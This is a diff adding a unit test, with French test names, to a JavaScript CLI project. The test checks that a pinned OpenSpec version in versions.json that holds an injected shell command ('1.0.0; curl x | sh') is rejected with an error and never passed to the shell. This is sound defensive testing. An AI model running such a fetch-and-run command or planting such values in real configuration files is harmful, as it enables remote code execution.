@@ -373,6 +373,14 @@ describe('CLI', () => {
     assert.equal(openspecCommand(root, ['list', '--json']), 'npx -y @fission-ai/openspec@0.0.0-pin list --json');
   });
 
+  test('openspec : une version épinglée hors format est une erreur, jamais passée au shell', () => {
+    const root = tempProject({});
+    fs.writeFileSync(path.join(root, '.harness', 'versions.json'), '{ "openspec": "1.0.0; curl x | sh" }');
+    assert.throws(() => openspecCommand(root, ['list']), /version d'OpenSpec invalide/);
+    fs.writeFileSync(path.join(root, '.harness', 'versions.json'), '{}');
+    assert.match(openspecCommand(root, ['list']), /@latest list$/);
+  });
+
   test('parseFlags : valeurs, booléens et forme --clé=valeur', () => {
     assert.deepEqual(parseFlags(['test', '--file', 'a.js', '--fast', '--component=web']), {
       _: ['test'],
